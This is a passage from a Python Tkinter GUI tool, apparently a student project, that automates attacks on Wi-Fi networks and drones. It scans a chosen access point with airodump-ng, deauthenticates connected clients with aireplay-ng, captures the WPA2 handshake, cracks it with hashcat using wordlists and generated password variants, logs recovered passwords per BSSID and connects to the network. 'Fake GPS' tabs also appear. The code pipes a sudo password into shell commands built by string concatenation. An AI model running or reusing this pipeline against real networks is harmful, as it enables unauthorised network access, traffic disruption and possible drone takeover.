GoToFakeGpsSIcon = PhotoImage(file = "Graphic/FakeGpsIconButton.png")
GoToFakeGps = Button(tab2, text = "FakeGPS",image=GoToFakeGpsSIcon,command=goTab9,
                 background = "black",foreground="#59C7F2",
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
GoToFakeGps.config(highlightbackground='black')
GoToFakeGps.place(x=370,y=410)

'''
tab2_Run_Button.config(text="  Halting the Process")
tab2_Run_Button.config(text="Click and stop the Process")
tab2_Run_Button.config(text="Search Access Point")
'''
'''
tab2_Run_Button.config(foreground="yellow")
tab2_Run_Button.config(foreground="Red")
'''

##########################################################
### Tab2 Multi-Threading Airdoump certain Access Point ###
##########################################################

class tab2_main2():

    def newThread(self):
        threading.Thread(target=self.test).start()    
        threading.Thread(target=self.tab2_pbstart).start()
        threading.Thread(target=self.tab3_pbstart).start()
    
    def tab2_pbstart(self):
        tab2_pb.start(10*12)
        time.sleep(10)
        tab2_lab3.place_forget()
        tab2_pb.stop()

    def tab3_pbstart(self):
        PB_TabThree.start(10*12)
        time.sleep(10)
        PB_TabThree.stop()        
        
    def test(self):
        os.system('echo '+ SuPasswd +' |sudo -S rm getStation*.*')
        cmd = 'echo '+ SuPasswd +" |sudo -S airodump-ng --bssid " + BSSID() + " -w getStation -c " + CHANNEL() + " " + getDelink()
        print(cmd)
        print()
        print('Access Point Information:')
        print('BSSID: ' + BSSID())
        print('Channel:' + CHANNEL())
        print('Privacy: ' + PRIVACY())
        print('Authentication:' + AUTH())
        print('ESSID: ' + ESSID())

        proc = subprocess.Popen(cmd, shell=True)
        time.sleep(10)
        os.system('echo '+ SuPasswd +' |sudo -S pkill airodump-ng')
        proc.terminate()
        note.tab(2, state="normal")
        note.select(tab3)
        printdata()

tab2_op2 = tab2_main2()

def tab2Run2():
    tab2_op2.newThread()

def removeItem():
    a = Treeview_TabTwo.selection()
    for x in a:
        Treeview_TabTwo.delete(x)

Delet = PhotoImage(file="Graphic/Delet.png")

tab2_del = Button(tab2,text="Delete Access Point",image=Delet,command=removeItem,
                  bg="black",fg="yellow",
                  font=("Helvetica",16,"bold"),relief="raised",compound="left",width=247)
#tab2_del.place(x=550,y=400)

####################
### Tab3 Graphic ###
####################

DeviceIcon = PhotoImage(file = "Graphic/Device.png")
DeviceIconSet = Label(tab3, image = DeviceIcon,bg="black")
DeviceIconSet.place(x=10, y=6, width=35, height=35)

###################################
### Tab3 Collect the Wi-Fi data ###
###################################

tab3Intro = "Detect what device are connecting to the accesspoint."
tab3_lab_intro = Label(tab3,text = tab3Intro, background="black",foreground="yellow",
                       font=("Helvetica", 16, "bold"))
tab3_lab_intro.place(x=48,y=10)

tab3_lab3 = Label(tab3,text="Double click station → delink",background = 'black', fg = 'red',
			font=("Helvetica", 16, "bold"))
tab3_lab3.place(x=10,y=510)

AutoDoNextFunction = Label(tab3,text="After delink will auto do the next frame",background = 'black', fg = 'yellow',
			font=("Helvetica", 16, "bold"))
AutoDoNextFunction.place(x=70,y=460)

checkBoxIcon = PhotoImage(file = "Graphic/checkboxTab3.png")
checkBoxSet = Label(tab3, image = checkBoxIcon,bg="black")
checkBoxSet.place(x=40, y=463, width=30, height=25)

###################################
### Tab3         Wi-Fi Old data ###
###################################


def UpdateNewPassword(BSSID,password):
    if len(BSSID)==17 and len(password)>7:
        try:
            save ='echo "'+str(BSSID)+'|"$(date "+%F %T")"|'+str(password)+'">>PasswordRecord.txt'
            os.system(save)
            return save
        except:
	        pass
        

def getLestPasswdTime(BSSID):
    if len(BSSID)==17:
        try:
            cmd="grep '"+BSSID+"' PasswordRecord.txt |tail -1"
            p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
            return(str(p).split('|')[1])
        except:
            return 'No record'
        
def getLestPasswd(BSSID):
    if len(BSSID)==17:
        try:
            cmd="grep '"+BSSID+"' PasswordRecord.txt |tail -1"
            p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
            return(str(p).split('|')[2][:-3])
            
        except:
            return 'No record'
    else:
        return 'No record'

def PasswordHistory(BSSID):

    if len(BSSID)==17:
        try:
            History = Toplevel()
            History.geometry('320x260')
            History.configure(background='black')
            Label(History,text="Password History:",background = 'black', fg = 'red',
                               font=("Helvetica", 16, "bold")).pack(side='top')
            tree = ttk.Treeview(History,columns=['1','2'],show='headings')
            tree.column('1',width=150,anchor='center')
            tree.column('2',width=150,anchor='center')
            tree.heading('1',text='Time')
            tree.heading('2',text='Password')
            tree.pack()

            cmd="grep '"+BSSID+"' PasswordRecord.txt"
            p = os.popen(cmd).readlines()
            for x in p:
                tree.insert('','end',values=[str(x).split('|')[1],str(x).split('|')[2]])
            History.mainloop()
        except:
            return 'No record'
    else:
        return 'No record'   


#PasswordHistory('A0:14:3D:FC:1E:87')
##################################
### Tab3 Station Chacking Label###
##################################
class Tab3Label:
    def __init__(self,text,x,y):
        self = Label(tab3,text = text, background="black",foreground="yellow",font=("Helvetica", 16, "bold")).place(x=x,y=y)

tab3_BSSID_lab  = Tab3Label("ESSID:"        ,48,50)
tab3_ESSID_lab  = Tab3Label("BSSID:"        ,48,90)
tab3_Passwd_lab = Tab3Label("Last Password:",48,130)
tab3_Enc_lab    = Tab3Label("Encryption:"   ,580,50)

tab3_BSSID_Ent = Entry(tab3,font=("Calibri",20),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab3_BSSID_Ent.place(x=130,y=48 , width=400,height=30)

tab3_ESSID_Ent = Entry(tab3,font=("Calibri",20),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab3_ESSID_Ent.place(x=130,y=88 , width=400,height=30)

tab3_Passwd_Ent = Entry(tab3,font=("Calibri",20),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab3_Passwd_Ent.place(x=220,y=128 , width=400,height=30)

tab3_Enc_Ent = Entry(tab3,font=("Calibri",20),foreground="yellow", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab3_Enc_Ent.place(x=700,y=48 , width=400,height=30)


tab3_BSSID_Ent.configure(state='readonly')
tab3_ESSID_Ent.configure(state='readonly')
tab3_Passwd_Ent.configure(state='readonly')
tab3_Enc_Ent.configure(state='readonly')

def tab3_BSSID_CText(Text):
    tab3_BSSID_Ent.configure(state='normal')
    tab3_BSSID_Ent.delete(0, END)
    tab3_BSSID_Ent.insert(END,str(Text))
    tab3_BSSID_Ent.configure(state='readonly')
    
def tab3_ESSID_CText(Text):
    tab3_ESSID_Ent.configure(state='normal')
    tab3_ESSID_Ent.delete(0, END)
    tab3_ESSID_Ent.insert(END,str(Text))
    tab3_ESSID_Ent.configure(state='readonly')
    
def tab3_Passwd_CText(Text):
    tab3_Passwd_Ent.configure(state='normal')
    tab3_Passwd_Ent.delete(0, END)
    tab3_Passwd_Ent.insert(END,str(Text))
    tab3_Passwd_Ent.configure(state='readonly')

def tab3_Enc_CText(Text):
    tab3_Enc_Ent.configure(state='normal')
    tab3_Enc_Ent.delete(0, END)
    tab3_Enc_Ent.insert(END,str(Text))
    tab3_Enc_Ent.configure(state='readonly')

##################################
### Tab3 Treeview and scrollbar###
##################################

Treeview_TabThree = Treeview(tab3,columns=("STATION","BSSID","STATION","PWR"), height = 12)

vsb2 = ttk.Scrollbar(tab3, orient="vertical", command=Treeview_TabTwo.yview)
vsb2.place(x=49+760+4, y=170, height=258)
Treeview_TabThree.configure(yscrollcommand=vsb2.set)

Treeview_TabThree.heading("#0",text="STATION PROVIDER")
Treeview_TabThree.heading("#1",text="STATION")
Treeview_TabThree.heading("#2",text="PWR")
Treeview_TabThree.heading("#3",text="RATE")
Treeview_TabThree.heading("#4",text="BSSID")

############################
### tab3 Multi-Threading ###
############################

class tab3_main:
    def newThread(self):
        threading.Thread(target=self.airodump).start()    
        threading.Thread(target=self.tab3_pbstart).start()
        
    def tab3_pbstart(self):
        PB_TabThree.start()
        time.sleep(2)
        PB_TabThree.stop()

    def airodump(self):
        for i in Treeview_TabThree.get_children():
            Treeview_TabThree.delete(i)
        #Insert Data
        with open(r"myOutput-01.csv") as f:
    
            reader = csv.reader(f, delimiter=',', quotechar='"')
            for row in reader:
                
                if len(row)==7:
                    if str(row[0])=="Station MAC":
                        continue
                    driveName=ReturnDeviceName(str(row[0]))
                    print(driveName)
                    listDATA2=[row[3],row[4],row[5],driveName]
                    Treeview_TabThree.insert("",index=END,text=row[0],values=listDATA2)

#Format
Treeview_TabThree.column("#0",anchor=CENTER,width=290)
Treeview_TabThree.column("#1",anchor=CENTER,width=168)
Treeview_TabThree.column("#2",anchor=CENTER,width=80)
Treeview_TabThree.column("#3",anchor=CENTER,width=80)
Treeview_TabThree.column("#4",anchor=CENTER,width=168)
Treeview_TabThree.pack(side = 'left',fill = 'y')
Treeview_TabThree.place(x=25,y=170)

#########################################
### Tab3 Treeview style configuration ###
#########################################
style = ttk.Style()
ttk.Style().theme_use('default')
style.configure(".", fg="red")
ttk.Style().configure("Treeview.Heading",background = "black",foreground="yellow")          
ttk.Style().configure("Treeview", background="black",foreground='yellow', fieldbackground="black") 

PB_TabThree = ttk.Progressbar(tab3,orient="horizontal",length=1000,mode="determinate")
PB_TabThree.place(x=0,y=553)

tab3op = tab3_main()

def tab3Run():
    tab3op.newThread()

tab3_try = Button(tab3,text="Reload",image=ab,command=tree_print_do,background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab3_try.place(x=690,y=450)

HistIcon = PhotoImage(file="Graphic/History.png")

def HisWindows():
    PasswordHistory(str(BSSID()))

tab3_History = Button(tab3,text="Password History",image=HistIcon,command=HisWindows,background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab3_History.place(x=580,y=120)
tab3_History.config(state="disable")


def check_print(event):
    curItem = Treeview_TabThree.focus()
    x = str(Treeview_TabThree.item(curItem)).split(",")
    STATION = x[0][10:27]
    
    if len(STATION)>1:
        BSSID = x[4][2:(len(x[4])-2)]
        RATE = x[3]
        tab3Run2()
        TabThree_SplittedText = STATION + '     ' + '     ' + RATE + '     ' + BSSID

Treeview_TabThree.bind('<Double-Button-1>',check_print)

##############################
### Tab3 Treeview function ###
##############################

def printdata():
    cmd = """awk -F ',' '{print $1 "," $6 "," $14}' getStation-01.csv|sed -n '3p'"""
    res = str(os.popen(cmd).readlines()[0]).split(',')
    try:
        tab3_BSSID_CText(str(res[0]).strip())
        tab3_ESSID_CText(str(res[2]).strip())
        tab3_Enc_CText(str(res[1]).strip())
        tab3_Passwd_CText(getLestPasswd(str(res[0]).strip()))
    except:
        pass

    for i in Treeview_TabThree.get_children():
        Treeview_TabThree.delete(i)

    cmd = """awk -F ',' 'length($6)>15{print $1","$4","$5","$6}' getStation-01.csv"""
    for x in os.popen(cmd).readlines():
        res = x.split(',')
        data =[res[0],res[1][1:],res[2].replace(' ',''),res[3][1:-1]]
        Treeview_TabThree.insert("",index = END, text = OtherDeviceName(res[0]), values = data,tag='resultList')
        Treeview_TabThree.tag_configure('resultList', foreground='lightgreen',background='black')

    if len(Treeview_TabThree.get_children()) == 0 or len(str(res[2]).strip()) == 0:
        note.select(tab2)
        print('error')
        questionBox()

    tab3_History.config(state="normal")
   
#messagebox.showwarning("Network Card","Warning, Please ensure having at leaset one network card.")
def questionBox():
    if messagebox.askretrycancel("Error", "Do you want to try again?") != False:
        tree_print_do()   
#value

def STATION():
    for i in Treeview_TabThree.get_children():
        Treeview_TabThree.delete(i)
    with open(r"getStation-01.csv") as f:
        reader = csv.reader(f, delimiter=',', quotechar='"')
        for row in reader:
            if len(row)<15 and len(row)>3:
                try:
                    int(row[4])
                except:
                    pass
                else:
                    STATION = row[0].strip()
    
    return STATION

def BSSID2():
    for i in Treeview_TabThree.get_children():
        Treeview_TabThree.delete(i)
    with open(r"getStation-01.csv") as f:
        reader = csv.reader(f, delimiter=',', quotechar='"')
        for row in reader:
            if len(row)<15 and len(row)>3:
                try:
                    int(row[4])
                except:
                    pass
                else:
                    BSSID2 = row[5].strip()
    
    return BSSID2

class tab3_main3():

    def newThread(self):
        threading.Thread(target=self.disconnect).start()    
        threading.Thread(target=self.tab3_pbstart).start() 
    
    def tab3_pbstart(self):
        PB_TabThree.start()
        time.sleep(1)
        PB_TabThree.stop()
   
    def disconnect(self):
        os.system('echo '+SuPasswd+' |sudo -S pkill airodump-ng')
        AireplayTarget = 'echo '+SuPasswd+" |sudo -S sudo aireplay-ng --ignore-negative-one -0 2 -a " + BSSID2() + " -c " + STATION() + " " + getDelink()

#################################################
### If the network is Open (without password) ###
#################################################

        if str(PRIVACY())=='OPN':
            OPNConnect(AireplayTarget)
            
###############################################
### If the network have Password (For WPA2) ###
###############################################

        elif str(PRIVACY())=='WPA2' and getLestPasswd(str(BSSID()))!='No record' :
            WPA2HavePasswd(AireplayTarget)

        elif str(PRIVACY())=='WPA2' and getLestPasswd(str(BSSID()))=='No record' :
            WPA2NoPasswd()

        else:
            print('Something error')
            print('Privcy : '+str(PRIVACY()))
            print('Last Password : ' + getLestPasswd(str(BSSID())))

def OPNConnect(AireplayTarget):
    os.system(AireplayTarget)
    tab3_main3()
    print('Command Of De-authentication: ' + AireplayTarget + '\n')
    os.system('echo '+ SuPasswd +" |sudo -S sudo aireplay-ng --ignore-negative-one -0 2 -a " + BSSID2() + " -c " + STATION() + " " + getDelink())
    #print('Message:' + wificonnect(str(BSSID()),str(getConnect())))
    print('Message:' + wificonnect(str(BSSID())))
    print('Message: It is a Open Wi-Fi Network!')

def WPA2HavePasswd(AireplayTarget):
    print('x')
    print(BSSID())
    print('x')
    print('Command Of De-authentication: ' + AireplayTarget + '\n')
    print(BSSID())
    print(getConnect())
    print(getLestPasswd(BSSID()))
    tab3_main3()
    os.system('echo '+ SuPasswd +" |sudo -S sudo aireplay-ng --ignore-negative-one -0 2 -a " + BSSID2() + " -c " + STATION() + " " + getDelink())
#    save = wificonnect(BSSID(),getConnect(),getLestPasswd(BSSID()))
    save = wificonnect(BSSID(),getLestPasswd(BSSID()))
    print(save)
    if save == 'Connected to the access point!':
        print('Message: It is a WPA2 Wi-Fi Network! Connected with a used password')
    elif save == 'Connected to the access point!':
        WPA2NoPasswd()
    else:
        note.select(tab3)
        ret = 'No access point with found please try again'
        #MsgboxShowConnect = messagebox.showinfo("Status", ret)
        os.system('echo ' + SuPasswd + ' | sudo -S sudo nmcli networking off;echo nmcliOff')
        os.system('echo ' + SuPasswd + ' | sudo -S sudo nmcli networking on;echo nmcliOn')
        pass#testing

def WPA2NoPasswd():
    print('Message: It is a WPA2 Network!')

    note.select(tab4)
#cap handshake

    CapHandshake(getDelink(),BSSID(),STATION(),CHANNEL())
    BackupCap(BSSID())
    print('last password is ' + getLestPasswd(str(BSSID())))

#Crack password
    print('>'+getLestPasswd(str(BSSID()))+'<')
    os.system('pkill notify-osd')
    subprocess.Popen(['notify-send','Start to crack password','-i','notification-network-wireless-connected'])

    if getLestPasswd(str(BSSID()))=='No record' :
        print('Use Default password list')
        CrackPasswordMainControlFunction()
    else:
        print('Use reference password list')
        CrackPasswordMainControlFunction(getLestPasswd(str(BSSID())))
        
    if len(str(retuenPassword()))>7:
        UpdateNewPassword(str(BSSID()),str(retuenPassword()))
    else:
        print('Crack password unsuccessful')

    os.system('pkill notify-osd')
    subprocess.Popen(['notify-send','Finish to crack password','-i','notification-network-wireless-connected'])
            
tab3_op2 = tab3_main3()

def tab3Run2():
    tab3_op2.newThread()

#########################################
### Tab4 Capturing Four Way Handshake ###
#########################################

HandshakeIcon = PhotoImage(file = "Graphic/handshake.png")
HandshakeIconSet = Label(tab4, image = HandshakeIcon,bg="black")
HandshakeIconSet.place(x=10, y=6, width=35, height=35)

Tab4Message = "Handshake (WPA/WPA2)"
Tab4Intro = Label(tab4, text = Tab4Message, background="black",foreground="yellow",
                       font=("Helvetica", 16, "bold"))
Tab4Intro.place(x = 48, y = 10)

handshakePict = PhotoImage(file = "Graphic/handshakePic.png")
handshakeicon = Label(tab4, image = handshakePict,bg="black")
handshakeicon.place(x=48, y=80, width=800, height=360)

########################################
### Four-Way handshake (If captured) ###
########################################

Tab4Shake = "Capturing four way Handshake . . . . . ."
Tab4Shake = Label(tab4, text = Tab4Shake, background='black', fg = '#4ABBFE',
                  font=("Helvetica", 16, "bold"))
Tab4Shake.place(x = 48, y = 500)

def Tab4ShakeRecordFN():

    tab4top = Toplevel()
    tab4top.title("Capture Recoed")
    tab4top.geometry('320x260')
    tab4top.configure(background='black')
    numBerOfRecord=str(len(os.listdir(os.getcwd()+'/CapFileSave')))
    Label(tab4top,text="Capture Recoed:  ("+numBerOfRecord+')',background = 'black', fg = '#4ABBFE',font=("Helvetica", 16, "bold")).pack(side='top')
    tab4tree = ttk.Treeview(tab4top,columns=['1','2'],show='headings')
    tab4tree.column('1',width=150,anchor='center')
    tab4tree.column('2',width=150,anchor='center')
    tab4tree.heading('1',text='Time')
    tab4tree.heading('2',text='Device Bssid')

    #insert data
    for res in os.listdir(os.getcwd()+'/CapFileSave'):
        if res[-4:]=='.cap':
            tab4tree.insert('','end',values=[res[0:4]+'-'+res[4:6]+'-'+res[6:8]+' '+res[9:11]+':'+res[11:13]+':'+res[13:15],res[-21:-4].replace('-',':')])
    tab4tree.pack()
    tab4top.mainloop()



Tab4ShakeRecordPic = PhotoImage(file = "Graphic/Tab4History.png")
Tab4ShakeRecord = Button(tab4,text="Capture Record",image=Tab4ShakeRecordPic,command=Tab4ShakeRecordFN,background = "black",foreground="#4ABBFE",highlightbackground='black',font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
Tab4ShakeRecord.place(x = 630, y = 495)

########################################################
### Tab4 ProgressBar While Capturing 4-way HandShake ###
########################################################

PB_TabFour = ttk.Progressbar(tab4, orient = "horizontal" ,length = 873, mode = "indeterminate")
PB_TabFour.place(x = 0, y = 553)

#PB_TabFour.start()
#note.select(tab4)
#PB_TabFour.stop()

######################################################
### Tab4 Multi-thread Capturing Four Way Handshake ###
######################################################

def CapHandshake(WifiInterface,DroneBssid,StationBssid,WifiChanel):
    # start PB_TabFour
    PB_TabFour.start()
    # go to tab 4
    note.select(tab4)

    os.system('echo '+SuPasswd+' | sudo -S rm *.cap')
    os.system('echo '+SuPasswd+' | sudo -S rm log*.csv')
    os.system('echo '+SuPasswd+' | sudo -S rm log*.netxml')

    os.system("echo "+SuPasswd+" | sudo -S gnome-terminal -x bash -c 'echo q |sudo -S airodump-ng --bssid " + str(DroneBssid) + " -w log -c " + str(WifiChanel) + " " + str(WifiInterface) + " &> output.txt'")
    #os.system('sudo airodump-ng --bssid A0:14:3D:FC:1E:87 -w log -c 8 wlan0mon &> output.txt')
    rescmd='grep handshake output.txt'
    os.system("echo "+SuPasswd+" | sudo -S gnome-terminal -x bash -c ' echo q |sudo -S sudo aireplay-ng --ignore-negative-one -0 2 -a " + str(DroneBssid) + " -c " + str(StationBssid) + " " + str(WifiInterface) + "'")
    while 1==1:
        time.sleep(2)
        res = str(subprocess.Popen(rescmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
        print('.')
        if len(res)>10:
	        print(len(res))
	        print('get handshake')
	        break

    os.system('echo '+SuPasswd+' | sudo -S rm output.txt')
    os.system('echo '+SuPasswd+' | sudo -S rm log*.csv')
    os.system('echo '+SuPasswd+' | sudo -S rm log*.netxml')
    os.system("echo "+SuPasswd+" | sudo -S pkill 'airodump-ng'")
    
    # stor PB_TabFour
    PB_TabFour.stop()

def Tab4Go():
    pass

tab4_Run = Button(tab4, text = "Get Four Way HandShake", command = Tab4Go,background = "black", fg = 'red',
                  font = ("Helvetica", 13, "bold"), relief = 'flat')
tab4_Run.place(x = 50, y = 80)

tab4_Run.place_forget()

###########################################
### Tab5 Crack password (WPA/WPA2) style###
###########################################

PB_TabFive = ttk.Progressbar(tab5, orient = "horizontal" ,length = 873, mode = "indeterminate")
PB_TabFive.place(x = 0, y = 553)

#PB_TabFive.start()
#note.select(tab5)
#PB_TabFive.stop()

UnlockIcon = PhotoImage(file = "Graphic/Unlock.png")
UnlockIconSet = Label(tab5, image = UnlockIcon,bg="black")
UnlockIconSet.place(x=10, y=6, width=35, height=35)

tab5string = " Crack Password (WPA/WPA2)"
tab5_intro= Label(tab5,text=tab5string,background="black",foreground="yellow",
                  font=("Helvetica", 16, "bold"))
tab5_intro.place(x=42,y=10)

CrackPasswdPict = PhotoImage(file = "Graphic/PasswdSecPic.png")
CrackPasswdicon = Label(tab5, image = CrackPasswdPict,bg="black")
CrackPasswdicon.place(x=10, y=50, width=800, height=360)

Tab5CapLab = "Cracking password . . . . . ."
Tab5Label = Label(tab5, text = Tab5CapLab, background='black', fg = '#4ABBFE',
                  font=("Helvetica", 16, "bold"))
Tab5Label.place(x = 48, y = 450)

Tab5PwList = Label(tab5, text = "Passwords list :", background='black', fg = '#4ABBFE',
                  font=("Helvetica", 16, "bold"))
Tab5PwList.place(x = 460, y = 450)

tab5_PwList_Ent = Entry(tab5,font=("Helvetica", 16, "bold"),foreground="#4ABBFE", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab5_PwList_Ent.place(x = 630, y = 450, width=400,height=30)
tab5_PwList_Ent.insert(END,' N / A ')
tab5_PwList_Ent.configure(state='readonly')

NCI = PhotoImage(file = "Graphic/tab1Check.png")
tab5_NetworkCard = Button(tab5,text="NetworkCard",image=NCI,command=goTab1,background = "black",foreground="#40C036",font = ("Helvetica", 16, "bold"),relief="raised",compound="left",highlightbackground='black')
tab5_NetworkCard.place(x=15,y=505,height=42)

DAPI = PhotoImage(file = "Graphic/tab1Detect.png")
tab5_DetectAccessPoint = Button(tab5,text="Detect Access Point",image=DAPI,command=goTab2,background = "black",foreground="#4ABBFE",font = ("Helvetica", 16, "bold"),relief="raised",compound="left",highlightbackground='black')
tab5_DetectAccessPoint.place(x=208,y=505,height=42)

DSI = PhotoImage(file = "Graphic/Device.png")
tab5_DetectStation = Button(tab5,text="Detect Station",image=DSI,command=goTab3,background = "black",foreground="#4ABBFE",font = ("Helvetica", 16, "bold"),relief="raised",compound="left",highlightbackground='black')
tab5_DetectStation.place(x=485,y=505,height=42)

FGI = PhotoImage(file = "Graphic/FakeGpsIconButton.png")
tab5_FakeGPS = Button(tab5,text="Fake GPS",image=FGI,command=goTab9,background = "black",foreground="#4ABBFE",font = ("Helvetica", 16
, "bold"),relief="raised",compound="left",highlightbackground='black')
tab5_FakeGPS.place(x=700,y=505,height=42)

def tab5_PwList_Ins(Text='Default list'):
    tab5_PwList_Ent.configure(state='normal')
    tab5_PwList_Ent.delete(0, END)
    if Text == 'Default list':
        tab5_PwList_Ent.insert(END,str(Text))
    else:
        tab5_PwList_Ent.insert(END,str('Reference '+Text))
    tab5_PwList_Ent.configure(state='readonly')

#tab5_PwList_Ins()
#tab5_PwList_Ins('12345678')

#####################################
### Tab5 Crack password (WPA/WPA2)###
#####################################
#function
def BackupCap(Bssid):
    #os.system("cp *.cap CapFileSave/$(date '+%Y%m%d_%H:%M:%S').cap")
    os.system("cp *.cap CapFileSave/$(date '+%Y%m%d_%H%M%S_'"+str(Bssid).replace(":","-")+").cap")
#BackupCap('A0:14:3D:FC:1E:87')
#A0:14:3D:FC:1E:87

#change cap2hccapx
def Genpassword(password):
    os.system('> CrackPasswdTools/passwordlist.txt')
    passwordletters= list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    saveData=''
    for x in range(len(password)):
        for y in range(len(passwordletters)):
            s = list(password)
            s[x]=passwordletters[y]
            result = "".join(s)
            if result != password:
                saveData=saveData+result+'\n'

    file1 = open("CrackPasswdTools/passwordlist.txt","a")
    file1.write(saveData)
    file1.close()

#default cracklist
def cap2hccapx():
    os.system('./CrackPasswdTools/hashcat-utils-master/src/cap2hccapx.bin $(ls |grep .cap|head -1) CrackPasswdTools/HashCatOfficialWebsite.hccapx')

def CrackpasswordDefaultList():
    print('Use default passwords list')
    cap2hccapx()
    os.system('./CrackPasswdTools/FYP-SSH-Local.sh')
    
def CrackpasswordGenList(Genpasswd):
    print('Genpassword references : ' + str(Genpasswd))
    cap2hccapx()
    Genpassword(Genpasswd)
    os.system('./CrackPasswdTools/FYP-SSH-Local-Genpasswd.sh')

def checkrequest():
    cmd='./CrackPasswdTools/FYP-SSH-TimeChecker.sh'
    while 1==1:
        p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
        time.sleep(1)
        print('.')
        if p.find('Stopped')>0:
            print('Get return Password')
            break
        
def retuenPassword():
    rescmd='./CrackPasswdTools/FYP-SSH-ReturnPasswd.sh'
    resq = str(subprocess.Popen(rescmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
    return resq[2:-3]

def CrackPasswdRefList(RefNum):
    tab5_PwList_Ins(str(RefNum))
    print('Using reference passwords list start now')
    Genpassword(str(RefNum))
    CrackpasswordGenList(str(RefNum))
    checkrequest()
    print('finish reference passwords list now')

def CrackPasswdDefList():
    tab5_PwList_Ins()
    print('Using default passwords list start now')
    CrackpasswordDefaultList()
    checkrequest()
    print('finish default passwords list now')

#tab5_PwList_Ins()
#tab5_PwList_Ins('12345678')

def CrackPasswordMainControlFunction(PasswordRef=''):
    #start TabFive pd bar
    PB_TabFive.start()
    #move to tab5
    note.select(tab5)
    BackupCap(BSSID())
    cap2hccapx()
    if len(PasswordRef)>7:
        CrackPasswdRefList(PasswordRef)
        if len(str(retuenPassword())) < 8:
            print('Reference password is fail now try to use default passwords list')
            CrackPasswdDefList()
    else:
        CrackPasswdDefList()

    if len(str(retuenPassword())) > 7 :
        print('Password is '+str(retuenPassword()))
    else:
        print('Creack password fail')

    #stop TabFive pd bar
    PB_TabFive.stop()

#CrackPasswordMainControlFunction()
#CrackPasswordMainControlFunction('12345677')

##############################
### Tab6 process bar theme ###
##############################

PB_TabSix = ttk.Progressbar(tab6, orient = "horizontal" ,length = 873, mode = "indeterminate")
PB_TabSix.place(x = 0, y = 553)

#PB_TabSix.start()
#note.select(tab6)
#PB_TabSix.stop()

##################################
### Tab6 Connect to wifi Frame ###
##################################

DetectIcon = PhotoImage(file = "Graphic/tab1Detect.png")
DetectIconSet = Label(tab6, image = DetectIcon,bg="black")
DetectIconSet.place(x=10, y=10, width=35, height=25)

DronePhotoIcon = PhotoImage(file = "Graphic/Drone3.png")
DronePhotoIconSet = Label(tab6, image = DronePhotoIcon,bg="black")
DronePhotoIconSet.place(x=560, y=10, width=250, height=250)

DetectPhotoIcon = PhotoImage(file = "Graphic/wifiAttana.png")
DetectPhotoIconSet = Label(tab6, image = DetectPhotoIcon,bg="black")
DetectPhotoIconSet.place(x=170, y=270, width=280, height=280)

class Tab6Label:
    def __init__(self,text,foreground,x,y):
        self = Label(tab6,text = text, background="black",foreground=foreground,font=("Helvetica", 16, "bold"))
        self.place(x=x,y=y)

tab6_intro_lab    = Tab6Label("Wifi Connect:","yellow",48,10)
tab6_BSSID_lab    = Tab6Label("BSSID:"       ,"Green",48,50)
tab6_AP_lab       = Tab6Label("ESSID:"       ,"Green",48,90)
tab6_Provider_lab = Tab6Label("Provider:"       ,"Green",48,130)
tab6_Status_lab   = Tab6Label("Status:"      ,"Green",48,170)


tab6_BSSID_Ent = Entry(tab6,font=("Calibri",20),foreground="Green", background="black", borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab6_BSSID_Ent.place(x=150,y=50 , width=400,height=30)

tab6_AP_Ent = Entry(tab6,font=("Calibri",20),foreground="Green", background="black",borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab6_AP_Ent.place(x=150,y=90 , width=400,height=30)

tab6_Provider_Ent = Entry(tab6,font=("Calibri",20),foreground="Green", background="black",borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab6_Provider_Ent.place(x=150,y=130 , width=400,height=30)

tab6_Status_Ent = Entry(tab6,font=("Calibri",20),foreground="Green", background="black",borderwidth = 0, highlightthickness = 0,readonlybackground="black")
tab6_Status_Ent.place(x=150,y=170 , width=400,height=30)

def tab6_BSSID_CText(Text):
    tab6_BSSID_Ent.configure(state='normal')
    tab6_BSSID_Ent.delete(0, END)
    tab6_BSSID_Ent.insert(END,str(Text))
    tab6_BSSID_Ent.configure(state='readonly')

def tab6_AP_CText(Text):
    tab6_AP_Ent.configure(state='normal')
    tab6_AP_Ent.delete(0, END)
    tab6_AP_Ent.insert(END,str(Text))
    tab6_AP_Ent.configure(state='readonly')
    
def tab6_Provider_CText(Text):
    tab6_Provider_Ent.configure(state='normal')
    tab6_Provider_Ent.delete(0, END)
    tab6_Provider_Ent.insert(END,str(Text))
    tab6_Provider_Ent.configure(state='readonly')
    
def tab6_Status_CText(Text):
    tab6_Status_Ent.configure(state='normal')
    tab6_Status_Ent.delete(0, END)
    tab6_Status_Ent.insert(END,str(Text))
    tab6_Status_Ent.configure(state='readonly')
    
##############################
### Tab6 Update Entry Data ###
##############################
def ConnectBssid():
    try:
        cmd="iwconfig "+getConnect()+" | grep -o '[^:]\+$' |line 1"
        p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
        if str(p).find('off/any')>0:
            return 'off/any'
        else:
            return str(p)[3:-6]
    except:
        return 'Disconnect'
      
def ConnectAP():
    try:
        cmd="iwconfig "+getConnect()+" |grep 'Access Point:'|line 1"
        p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
        if str(p).find('Not-Associated')>0:
